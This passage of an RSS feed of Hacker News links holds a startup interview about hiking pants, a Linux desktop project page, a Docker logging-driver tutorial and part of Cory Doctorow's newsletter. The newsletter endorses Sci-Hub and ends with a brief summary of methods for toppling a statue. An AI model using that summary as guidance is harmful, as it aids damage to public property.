we needed to be making the product or selling it first, so that we have the capital to pay for the patents, or if we needed to patent everything first before we sold any units. We figured that out through trial and error and talking to lawyers. We ended up handling the IP first and perfecting the design. We launched through a crowdfunding campaign. We took pre-orders before we had made the product, and that was very helpful for us, because we didn’t have to put in many thousands of dollars to create a product that we weren’t sure people wanted. We also knew how much of each size we needed, and we could also use that data to predict what sizes we should make for the next run of product.&nbsp;</p><p><strong>Did the idea evolve as things progressed?&nbsp;</strong></p><p>We’ve changed a lot. One of the biggest pieces of feedback we’ve gotten is that people want the product in a lighter colour. Partly because they want another style, partly because when you’re hiking in the summer, the black fabric feels warmer against your skin and partly because of tick prevention – you can’t see ticks very easily if they’re in black.&nbsp;</p><p>We also had originally planned on having a smaller size run, and not having different in-seam lengths. But we got a lot of really insistent and positive feedback about expanding that. When we were first prototyping, we used very bright colours. We would use pink pants with blue zippers, and we realised pretty quickly that although some people loved it, most people preferred simple black pants.&nbsp;</p><p><strong>Did you encounter any unique challenges because you have to go through a whole manufacturing process?</strong></p><p>It was and has continued to be extremely difficult to manage the supply chain. The factory we were using is now shutting down because of COVID. So we had to re-do our entire supply chain. So that was definitely a challenge we were not anticipating. It’s ended up okay. The new manufacturer is a lot bigger and we can scale a lot more quickly. A big challenge that we had was that we manufactured in India. We manufactured in a Fairtrade facility. They had great communication, were very helpful, could do really small minimums, but we realised pretty earlier that we would not be able to source the type of fabric that we wanted from India. We could get really good cotton, but you couldn’t find polyester or nylon or anything that we would want. We had to import from Taiwan to India and that took a really, really long time. The fabric got stuck in customs, and we had to spend a lot more than anticipated on getting the fabric to the factory.&nbsp;</p><p>We had a lot of trouble sourcing our zippers, partly because YKK does not have the best customer service when you’re small. They expect you to be ordering hundreds of thousands of zippers, and we weren’t ordering that many. So we kept getting passed around between different customer service representatives and we ended up getting zippers from a YKK storage facility. They ended up working fine, but it took two months longer than …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.journeyoftheidea.com/posts/shefly">https://www.journeyoftheidea.com/posts/shefly</a></em></p>]]>
            </description>
            <link>https://www.journeyoftheidea.com/posts/shefly</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731761</guid>
            <pubDate>Sat, 04 Jul 2020 12:15:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Welcome to MaXX Interactive Desktop]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 3 (<a href="https://news.ycombinator.com/item?id=23731714">thread link</a>) | @rbanffy
<br/>
July 4, 2020 | https://maxxinteractive.com/books/misc/page/welcome-to-maxx-interactive-desktop | <a href="https://web.archive.org/web/*/https://maxxinteractive.com/books/misc/page/welcome-to-maxx-interactive-desktop">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div dir="auto">

    

    

            <blockquote id="bkmrk-new-version-of-maxx-">
<h4 id="bkmrk-%C2%A0-1"><strong><em>New version of MaXX Interactive Desktop is now </em><a href="https://maxxinteractive.com/books/mid-v21-installation-guide"><em>available</em></a></strong></h4>
<h5 id="bkmrk-%3E%3E-link-to-release-n"><em><strong><a title="July 4th 2020 - Release Day for MaXX Desktop v2.1" href="https://maxxinteractive.com/books/whats-new/page/july-4th-2020---release-day-for-maxx-desktop-v21-a8a">&gt;&gt; Link to Release Notes &lt;&lt;</a></strong></em></h5>
</blockquote>

<hr id="bkmrk-"><h5 id="bkmrk-yes-the-maxx-interac"><em><strong>Yes the MaXX Interactive Desktop is the little brother of the great SGI Desktop on IRIX!</strong></em></h5>

<p id="bkmrk--0"><strong><a href="https://cdn.maxxinteractive.com/uploads/images/gallery/2020-05/Screenshot-from-2020-05-30-09-53-45.png" target="_blank" rel="noopener"><img src="https://cdn.maxxinteractive.com/uploads/images/gallery/2020-05/scaled-1680-/Screenshot-from-2020-05-30-09-53-45.png" alt="Screenshot-from-2020-05-30-09-53-45.png"></a><br>MaXX Desktop v2.1 in Modern look and feel</strong></p>
<h3 id="bkmrk-introduction">Introduction</h3>
<p id="bkmrk-the-maxx-interactive">The MaXX Interactive Desktop a.k.a.&nbsp; MaXX Desktop or MID is the continuation of the 5dwm.org project released many years back. &nbsp; By the way, the 5dwm.org website is not associated with us anymore and we do not endorse its content, although it's ours and was miss-appropriated from us a few years ago.&nbsp; Back to our regular program :)&nbsp; So don't be mistaken, there is only one other real implementation of the IRIX Interactive Desktop(IID) and&nbsp; it's MaXX Desktop!</p>
<p id="bkmrk-more-info-on-the-ori"><a title="Not just a theme..." href="https://maxxinteractive.com/books/misc/page/not-just-a-theme"><strong>&gt;&gt; More details on what MaXX Desktop is made of</strong></a></p>
<h3 id="bkmrk-our-mission"><br>Our Mission</h3>
<p id="bkmrk-our-goal-is-to-bring">Our mission is to bring back this great user experience which focused on performance, stability and productivity while sporting a smooth-clean-minimalism look and feel&nbsp; with low-resources consumption. A smart desktop that puts the user's application in the forefront.&nbsp; <em><strong>More for your creativity.</strong></em></p>
<p id="bkmrk-so-there-is-no-surpr">So there is no surprises here, MaXX Desktop is a highly tuned Workstation Environment which can leverage&nbsp; multi-core&nbsp; workload processing, robust asynchronous multi-threaded POSIX Messaging, hardware acceleration and GPU specific optimizations that&nbsp; makes the MaXX Desktop so fast, light-weight and dependable. Enough geekin' out for now, although, we are and proud to be.</p>
<p id="bkmrk-maxx-desktop-is-a-tr">MaXX Desktop is a true re-implementation of the SGI Desktop while respecting the classic/retro SGI look and feel (which is very important for us to get it right), but also to expand and build on top of those solid foundations with a more modern-current user experience.&nbsp; See it as the <em>classic</em> or<em>original&nbsp;</em> look and feel of the desktop and a new <em>modern</em> take.&nbsp; We want the modern look to be/feel like a natural evolution of the classic SGI look, as if SGI did it themselves throughout several years perfecting an already pretty awesome recipe. &nbsp; The modern look still supports SGI Color Schemes and introduce UTF-8 support, anti-aliased font rendering, more hardware acceleration and a new virtual-desktop manager.</p>
<p id="bkmrk-we-believe-in-a-high">We believe in a High Performance Desktop Environment that provides the right set of tools to maximize creativity and productivity without sacrificing&nbsp; your system resources to some eye candy non-sense.&nbsp;<em> <strong>Again, less is more... And it keeps you focused.<br></strong></em></p>
<h3 id="bkmrk-from-the-ground-up">From the Ground Up</h3>
<p id="bkmrk-maxx-desktop-is-desi">The MaXX&nbsp; Desktop is designed from the ground up for speed,&nbsp; fast/responsive, lightweight/simplicity over eye-candidness, but more importantly, to get the heck out of your way... The name <em>MaXX Interactive</em> doesn't mean maximum visual interaction, which are distractions or so what we call, UI noises. It's means maximum creativity with interactive assistance from the Desktop. In may ways, it's made for you and your brain so that it can relax, focus on let the creative juice flowing with far fever distractions. We see desktop notifications in a very different way, but this is for another discussion. In short, the MaXX Desktop let you focus on the creative&nbsp; tasks ahead without interference or visual distractions.<em><strong>&nbsp; Our design philosophy is simple, do more with less...</strong></em></p>
<h3 id="bkmrk-experience-matter">Experience Matters</h3>
<p id="bkmrk-finally%2C-our-team-me">Our team is sharing the same vision of making use of the right set of technologies, using industry proven best practices and guide lines to build the right software, the right way.&nbsp; We aim at providing a consistent and pleasant user experience built on top of modern and stable foundations but yet flexible.&nbsp; Every good and useful piece of tech deserves to be future-proof...&nbsp; This is where&nbsp; several decades of experience in building battle-proven mission critical systems and high performance Enterprise class applications comes in.&nbsp; If it's architect-ed properly,&nbsp; it can evolve without breaking apart!</p>
<h3 id="bkmrk-is-maxx-desktop-for-">Is MaXX Desktop for you?</h3>
<p id="bkmrk-maxx-desktop%27s-typic">MaXX Desktop's typical users are: 2D/3D Computer Graphics Artists, Motion Pictures and Special Effects Studios, Software/Game Developers, Visualization/Simulation, Virtual Reality power-users or Oil and Gas research to name a few.&nbsp; MaXX Desktop is also for anyone who wants get a break from all the surrounding noises and to create stuff while sporting a very unique/cool daily driver!&nbsp; <em><strong>Then, MaXX&nbsp; is for you too!&nbsp;</strong></em></p>
<hr id="bkmrk--1"><h3 id="bkmrk-navigation">Navigation</h3>
<p id="bkmrk-this-site-is-powered"><em>This site is powered by <a href="https://www.bookstackapp.com/" target="_blank" rel="noopener"><strong>BookStack</strong></a> (a type of Wiki engine) and you can navigate it by using the upper-right links 'Shelves and Books'.&nbsp; You may use the search bar on top or the convenient links below.</em></p>
<p id="bkmrk-the-maxx-desktop-tea">The MaXX Desktop team</p>
    </div></div>]]>
            </description>
            <link>https://maxxinteractive.com/books/misc/page/welcome-to-maxx-interactive-desktop</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731714</guid>
            <pubDate>Sat, 04 Jul 2020 12:01:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is it just me, or is this founder’s bio machine generated?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731666">thread link</a>) | @matthewsinclair
<br/>
July 4, 2020 | https://www.vaxport.com/team/dr-gy-mozolowski/ | <a href="https://web.archive.org/web/*/https://www.vaxport.com/team/dr-gy-mozolowski/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                    <h3>About Me</h3>
<p>Dr Guy Mozolowski (PhD) originally trained as a biochemist and microbiologist, and has 15 years experience in the In Vitro diagnostics industry. He specialises in designing, developing and commercialising high throughput assay systems and In Vitro diagnostic platforms. His experience encompasses food, diary, water, brewing, veterinary and clinical industries. He has collaborated on commercial, governmental and academic projects with a number of academic and multinational institutions. Dr Mozolowski specialises in start-up and SME operations; most recently scaling a novel biomarker test for the commercial market from an academic spin-out.</p>
 
                </div>
                            </div></div>]]>
            </description>
            <link>https://www.vaxport.com/team/dr-gy-mozolowski/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731666</guid>
            <pubDate>Sat, 04 Jul 2020 11:46:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PixelArt web based animation editor]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731564">thread link</a>) | @kinoro
<br/>
July 4, 2020 | https://www.drawpool.com/edit-post/pixelart/gif | <a href="https://web.archive.org/web/*/https://www.drawpool.com/edit-post/pixelart/gif">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.drawpool.com/edit-post/pixelart/gif</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731564</guid>
            <pubDate>Sat, 04 Jul 2020 11:23:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Docker logging driver configuration – JSON-file and journald]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731527">thread link</a>) | @lukasbar
<br/>
July 4, 2020 | https://knowledgepill.it/posts/docker_logging_driver/ | <a href="https://web.archive.org/web/*/https://knowledgepill.it/posts/docker_logging_driver/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p>Docker allows us to stream logs to different places with plugins called logging drivers.</p>
<p>How to change logging driver? What’s the most popular ones?</p>

<p>Docker has got two types of logging drivers:</p>
<ul>
<li>built-in like:
<ul>
<li><code>awslogs</code></li>
<li><code>fluentd</code></li>
<li><code>gcplogs</code></li>
<li><code>gelf</code></li>
<li><code>journald</code></li>
<li><code>json-file</code></li>
<li><code>local</code></li>
<li><code>logentries</code></li>
<li><code>splunk</code></li>
<li><code>syslog</code></li>
</ul>
</li>
<li>external drivers that we can install with <code>docker plugin install</code></li>
</ul>
<p>Logging driver is used to forward logs from containers to specific log aggregators, widely known rsyslog or fluentd for example.</p>
<p>Default logging driver after installation is <code>json-file</code>.</p>
<p>It is important to test non default logging drivers before using on production - problems with logging can cause crash/hang or startup problems with containers.</p>
<h2 id="check-default-logging-driver">Check default logging driver</h2>
<p>This is driver that docker daemon will use for itself and containers that won’t have set explicit another driver at start</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 ~<span>]</span>$ docker info --format <span>'{{.LoggingDriver}}'</span>
json-file
</code></pre></div>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 docker<span>]</span><span># docker container ls</span>
CONTAINER ID        IMAGE               COMMAND              CREATED              STATUS              PORTS               NAMES
7e0f1ab24716        httpd               <span>"httpd-foreground"</span>   About a minute ago   Up About a minute   80/tcp              web_server_httpd

<span>[</span>lukas@docker-host1 docker<span>]</span><span># docker inspect -f '{{.HostConfig.LogConfig.Type}}' web_server_httpd</span>
json-file
</code></pre></div>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 docker<span>]</span><span># docker container inspect web_server_httpd --format "{{.LogPath}}"</span>
/var/lib/docker/containers/7e0f1ab2471674b020f39a03e6c1cc49f8c70378acb5ca94d4323dc2cbeecb68/7e0f1ab2471674b020f39a03e6c1cc49f8c70378acb5ca94d4323dc2cbeecb68-json.log
</code></pre></div><h2 id="logs-from-docker-cli-command">Logs from docker cli command</h2>
<p>This command will work fine with default ‘json-log’ driver, can fail with non default ones</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 docker<span>]</span><span># docker logs web_server_httpd</span>
AH00558: httpd: Could not reliably determine the server<span>'s fully qualified domain name, using 172.17.0.3. Set the '</span>ServerName<span>' directive globally to suppress this message
</span><span>AH00558: httpd: Could not reliably determine the server'</span>s fully qualified domain name, using 172.17.0.3. Set the <span>'ServerName'</span> directive globally to suppress this message
<span>[</span>Tue May <span>05</span> 13:28:43.383499 2020<span>]</span> <span>[</span>mpm_event:notice<span>]</span> <span>[</span>pid 1:tid 140713807934592<span>]</span> AH00489: Apache/2.4.43 <span>(</span>Unix<span>)</span> configured -- resuming normal operations
<span>[</span>Tue May <span>05</span> 13:28:43.405939 2020<span>]</span> <span>[</span>core:notice<span>]</span> <span>[</span>pid 1:tid 140713807934592<span>]</span> AH00094: Command line: <span>'httpd -D FOREGROUND'</span>
</code></pre></div>
<p>We can set default log-driver in <code>/etc/docker/daemon.json</code>.
Format:</p>
<div><pre><code data-lang="bash"><span>{</span>
  <span>"log-driver"</span>: <span>"&lt;log_driver_name&gt;"</span>,
  <span>"log-opts"</span>: <span>{</span>
    <span>"&lt;log_opt1_name&gt;"</span>: <span>"&lt;log_opt1_value&gt;"</span>,
    <span>"&lt;log_opt2_name&gt;"</span>: <span>"&lt;log_opt2_value&gt;"</span>
  <span>}</span>
<span>}</span>
</code></pre></div><hr>
<h3 id="log_opts-for-json-file"><code>log_opts</code> for <code>json-file</code></h3>
<ul>
<li>max-size - max file size</li>
<li>max-file - max number of files</li>
<li>labels - list of keys of labels hat should be in log - if container has them set</li>
<li>env - list of variables that should be in log - if container has them set</li>
</ul>
<hr>

<div><pre><code data-lang="bash"><span>[</span>root@docker-host1 ~<span>]</span><span># vi /etc/docker/daemon.json</span>
<span>{</span>
    <span>"log-driver"</span>: <span>"</span><span>journald
</span><span>}
</span></code></pre></div><p>As in <code>json-file</code> we can optionally add another parameter <code>log_opts</code> to set some flags for <code>journald</code> driver:</p>
<ul>
<li>tag - Use to change CONTAINER_TAG and SYSLOG_IDENTIFIER</li>
<li>labels - list of keys of labels hat should be in log - if container has them set</li>
<li>env	-	list of variables that should be in log - if container has them set</li>
</ul>
<p>After configuration change we should restart docker daemon:</p>
<div><pre><code data-lang="bash"><span>[</span>root@docker-host1 ~<span>]</span><span># systemctl restart docker</span>
</code></pre></div><p>After starting container we can check his logs with <code>journalctl</code> command</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 ~<span>]</span><span># docker run -d --name web_server_httpd httpd</span>

<span>[</span>lukas@docker-host1 ~<span>]</span><span># journalctl CONTAINER_NAME=web_server_httpd</span>
-- Logs begin at Tue 2020-05-05 16:08:42 CEST, end at Tue 2020-05-05 16:12:28 CEST. --
May <span>05</span> 16:12:28 docker-host1.lukas.int 5c331ed1a91b<span>[</span>1752<span>]</span>: AH00558: httpd: Could not reliably determine the server<span>'s fully qualified domain name, using 172.17.0.2. Set the &gt;
</span><span>May 05 16:12:28 docker-host1.lukas.int 5c331ed1a91b[1752]: AH00558: httpd: Could not reliably determine the server'</span>s fully qualified domain name, using 172.17.0.2. Set the &gt;
May <span>05</span> 16:12:28 docker-host1.lukas.int 5c331ed1a91b<span>[</span>1752<span>]</span>: <span>[</span>Tue May <span>05</span> 14:12:28.492926 2020<span>]</span> <span>[</span>mpm_event:notice<span>]</span> <span>[</span>pid 1:tid 140110908605568<span>]</span> AH00489: Apache/2.4.43 <span>(</span>Unix<span>)</span> co&gt;
May <span>05</span> 16:12:28 docker-host1.lukas.int 5c331ed1a91b<span>[</span>1752<span>]</span>: <span>[</span>Tue May <span>05</span> 14:12:28.517394 2020<span>]</span> <span>[</span>core:notice<span>]</span> <span>[</span>pid 1:tid 140110908605568<span>]</span> AH00094: Command line: <span>'</span>httpd -D FORE&gt;
</code></pre></div><p>Your non priliged user should be in <code>systemd-journal</code> OS group to use <code>journalctl</code> command</p>

<p>We have now as default configured <code>journald</code> - but we can override this when starting container</p>
<div><pre><code data-lang="bash"><span>[</span>lukas@docker-host1 ~<span>]</span>$ docker run -d --name web_server --log-driver json-file httpd
9427635d3943c2cf7fa48f0fe82f00b06bd5026619151437858ec9d40bc1b7ad
</code></pre></div><p>We can also set options for driver with <code>--log-opt</code> followed by &lt; key &gt;=&lt; value &gt;.<br>
For multiple flags we add multiple <code>--log-opt</code> params.</p>

</div></div>]]>
            </description>
            <link>https://knowledgepill.it/posts/docker_logging_driver/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731527</guid>
            <pubDate>Sat, 04 Jul 2020 11:11:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dear office, your services are terminated]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731404">thread link</a>) | @kervokian
<br/>
July 4, 2020 | https://icdindia.com/posts/dear-office-your-services-are-terminated/ | <a href="https://web.archive.org/web/*/https://icdindia.com/posts/dear-office-your-services-are-terminated/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://icdindia.com/posts/dear-office-your-services-are-terminated/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731404</guid>
            <pubDate>Sat, 04 Jul 2020 10:33:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buying (not licensing) my [Cory Doctorow's] ebooks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23731393">thread link</a>) | @samizdis
<br/>
July 4, 2020 | https://pluralistic.net/2020/07/03/monument-toppling-season/#books | <a href="https://web.archive.org/web/*/https://pluralistic.net/2020/07/03/monument-toppling-season/#books">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1058">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:


Summary:
Working as intended; Buying (not licensing) my ebooks; Scihub boosts cites; Topple monuments...with science; Privacy Analyzer; Frederick Douglass's descendants read his July 4 speech

URL:
https://pluralistic.net/2020/07/03/monument-toppling-season/

Title:
Pluralistic: 03 Jul 2020 monument-toppling-season

Bullet:
🤾🏿

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Slashdot (https://slashdot.org/), Kottke (https://kottke.org/), Dennis, Skepchick (https://skepchick.org/).

--><br>
<a href="https://pluralistic.net/2020/07/03/monument-toppling-season/"><img src="https://i0.wp.com/craphound.com/images/03Jul2020.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/03Jul2020.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#jul-21">Working as intended</a>: My upcoming free lecture on the role monopoly plays in distorting our discourse and creating conspiracies.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#books">Buying (not licensing) my ebooks</a>: The best way to get my ebooks and audiobooks.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#citation-needed">Scihub boosts cites</a>: Public sphere vs Elsevier.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#leverage">Topple monuments…with science</a>: Popular Mechanics is here for you.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#dont-bug-me">Privacy Analyzer</a>: What does the web know about you?
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#all-countries-matter">Frederick Douglass's descendants read his July 4 speech</a>: "What to the Slave is the Fourth of July?"
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#retro">This day in history</a>: 2010, 2015, 2019
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/07/03/monument-toppling-season/#bragsheet">Colophon</a>: Recent publications, upcoming appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="jul-21"></a><br>
<img src="https://i1.wp.com/craphound.com/images/kreskinml.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/kreskinml.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>On Jul 21, I'm giving a free live talk with Q&amp;A; for LogicLounge, an 32nd CAV 2020 event sponsored by the Vienna Center for Logic and Algorithms.</p>
<p>It's called "Working as Intended: Surveillance Capitalism is not a Rogue Capitalism," which is (not coincidentally) the title of a forthcoming pamphlet I've written on the role that monopoly plays in our toxic and conspiratorial discourse.</p>
<p><a href="https://stanford.zoom.us/webinar/register/WN_9AwAiQSmTj2ZjaIsIoTr5A">https://stanford.zoom.us/webinar/register/WN_9AwAiQSmTj2ZjaIsIoTr5A</a></p>
<p>The "surveillance capitalism" thesis holds that companies spy because data lets them conduct devastatingly effective influence operations while racing past regulators who might otherwise rein in their operations.</p>
<p>I believe this gives undue credence to Big Tech's sales literature — the source of the claims about the power of behavioral advertising to influence behavior. Worse, it underplays the role that monopoly and state surveillance play in both the decay of public discourse and governmental complacency when it comes to corporate surveillance.</p>
<p>What if Big Tech's ability to command billions for ads have more to do with cornering markets and eking out marginal gains through targeting, with stale data being largely useless for commercial purposes — but still full of kompromat for greedy state surveillance agencies?</p>
<hr>
<p><a name="books"></a><br>
<img src="https://i1.wp.com/craphound.com/images/staehleindex.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/staehleindex.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Many people have written lately asking for the best way to get electronic editions of my books and audiobooks, so now's a good time to remind you that I run my own ebook store, where I sell my publishers' electronic editions of my books:</p>
<p><a href="https://craphound.com/shop/">https://craphound.com/shop/</a></p>
<p>So I'm getting the 30% that Amazon would take if you bought the books from them, then I send the 70% to my publishers, and then <em>they</em> send me 25% of that back as my royalty – basically doubling my income.</p>
<p>But it's also a better deal for you: while all my books, in all bookstores, are sold without DRM (including these ones), these ebooks are also sold with <em>no terms and conditions</em>. Kindle books require that you "agree" to a sprawling garbage novella of impenetrable legalese.</p>
<p>Clicking "Buy" is also clicking "Agree" and what you agree to is a near-total waiver of your privacy and consumer rights. Amazon even reserves the right to reach into your device and delete your books if they change their minds about selling them to you.</p>
<p>They've done that before…with George Orwell's Nineteen Eighty-Four. No, I'm not making that up.</p>
<p><a href="https://www.nytimes.com/2009/07/18/technology/companies/18amazon.html">https://www.nytimes.com/2009/07/18/technology/companies/18amazon.html</a></p>
<p>I have asked dozens of Amazon press spokespeople whether they would do this again, and…crickets.</p>
<p>I once got invited to give a paid speech at Amazon and I said, "Sure, I'll even waive my fee. Just answer my questions about whether you will delete the Kindle books people buy in the future." I never got an answer, and I never gave the speech.</p>
<p>My store's also got my audiobooks. You can't even buy those on Amazon, or its audiobook monopolist Audible – that's because Audible refuses to carry my audiobooks because they're DRM-free.</p>
<p>Every book on Audible has DRM that locks it forever – even after the copyright has expired – to Amazon's platform. They and they alone can decide which devices can play those books.</p>
<p>This is the company that one day decided (for example) that it wouldn't stream its video to rivals' TV dongles, like Google's Chromecast. They changed their mind…eventually. Do you think it's the last time they'll change it?</p>
<p>Audible controls 90%+ of the audiobook market, and audiobooks presently account for about the same number of sales as hardcovers. That's an entire universe of literature that is under total control of a monopolist.</p>
<p>There are rivals to Audible that have virtually identical inventories and exactly the same prices: libro.fm, downpour.com, and – for my audiobooks, at least – craphound.com/shop.</p>
<p>My audiobooks – like my ebooks – come with no terms and conditions. The deal you make with me is the same deal you make with bookstores when you buy physical books: "Every right Congress ever gave you is intact. Don't violate copyright. We're cool. Thank you and come again."</p>
<p>As far as I know, this is the <em>only</em> way to buy ebooks published by commercial publishers without signing away your rights. It's not a "license," it's a sale. You bought it, you own it. It's a book. Books are older than copyright, than publishing, than paper, than commerce.</p>
<p>I totally reject the idea that the ancient compacts that bind us when we trade in literature can be unilaterally rewritten by a monopolist simply by making you click "I agree."</p>
<hr>
<p><a name="citation-needed"></a><br>
<img src="https://i2.wp.com/craphound.com/images/scihubcites.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/scihubcites.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Alchemy looks a lot like science: an alchemist observes a phenomenon, hypothesises a causal relationship, and designs and performs an experiment to test the hypothesis.</p>
<p>The difference is in what happens next.</p>
<p>The scientist publishes their findings so that others can critique it. The alchemist does not. Scientists aren't smarter than alchemists, so scientists are every bit as capable of making themselves believe that drinking mercury is good for their health.</p>
<p>But scientists have to expose their work to peer-review, which means that their self-deception can be exposed and corrected. Alchemists just die of mercury poisoning.</p>
<p>Today, most peer-review happens through publication by a handful of giant, monopolistic journal publishers.</p>
<p>Scholarly and scientific research, most of it publicly funded, is given for free to these multibillion-dollar empires, who then charge the institutions where the authors work millions to access the journals in which that work appears.</p>
<p>The editorial boards and reviewers of these journals are volunteer positions, filled by scholars from those same institutions that pay millions to access the journals they're producing.</p>
<p>The journals themselves are pure rentiers, useless intermediaries that barely even edit the papers they publish:</p>
<p><a href="https://arxiv.org/pdf/1604.05363.pdf">https://arxiv.org/pdf/1604.05363.pdf</a></p>
<p>And yet, scholars send them work, because their career advancement depends on publication, preferably in widely cited journals.</p>
<p>For more than a decade, scholars have been fighting back, switching to "open access" journals that fund their (minimal) costs by charging to submit a paper for review and then publish for free. Major science funders now demand that grantees promise open access publication.</p>
<p>But the paywalled journals are still hanging in there. They have huge warchests of money looted from universities, and they have massive, locked up back-catalogs of scholarly work whose copyright they extorted from uncompensated researchers.</p>
<p>Enter Scihub, an unauthorized repository of millions of scientific and scholarly papers liberated from paywalls and made available for free to all comers.</p>
<p>The scholarly publishing industry hates Scihub so much that they've actually gone to courts around the world to demand that Scihub and its mirrors be blocked by national firewalls, censoring science in a bid to restore the mercury-swilling days of alchemy.</p>
<p>But what about the scholars – the actual researchers whose uncompensated words publishers sue to suppress when they go after Scihub?</p>
<p>For them, Scihub is a godsend.</p>
<p>Not only does Scihub make it possible for scholars to see all the literature they need to review to continue their work, irrespective of institutional affiliation (this is especially important in the Global South, where many universities can't afford subscriptions).</p>
<p>But – as a quartet of scholars from Brazil, Colombia, Czech, and Australia show in a new paper…well, the title says it all, really: "THE SCI-HUB EFFECT: SCI-HUB DOWNLOADS LEAD TO  MORE ARTICLE CITATIONS."</p>
<p><a href="https://arxiv.org/pdf/2006.14979.pdf">https://arxiv.org/pdf/2006.14979.pdf</a></p>
<p>That is, when your work is freely available, more people read it and cite it. And for scholars, more citations means more career opportunities: jobs, grants, conference invites…Everything that matters to the progress of scholarship.</p>
<p>I mean, yes, it's obvious, but it has some pretty fascinating implications – like, "If you're a scientist who wants to progress, you should let Nature publish your work and get the prestige, then defeat Nature's paywall so that Scihub can distribute it and get the impact."</p>
<hr>
<p><a name="leverage"></a><br>
<img src="https://i0.wp.com/craphound.com/images/temperature-strength-metals-1592244728.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/temperature-strength-metals-1592244728.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>With monument-toppling season upon us, it's time for the popular scientific and engineering press to dust off their beloved "What's the scientifically best way to tear down a statue" pieces and republish them for our quick reference.</p>
<p>"How to Topple a Statue Using Science," by James Stout for Popular Mechanics covers all the classics:</p>
<p><a href="https://www.popularmechanics.com/science/a32870657/remove-statue-science/">https://www.popularmechanics.com/science/a32870657/remove-statue-science/</a></p>
<p>Leverage: Get 70 buddies (for a notional 7000lb horse statue), 4×4 recovery straps (tied for leverage, look for heads, etc), split in two teams and rock back and forth.</p>
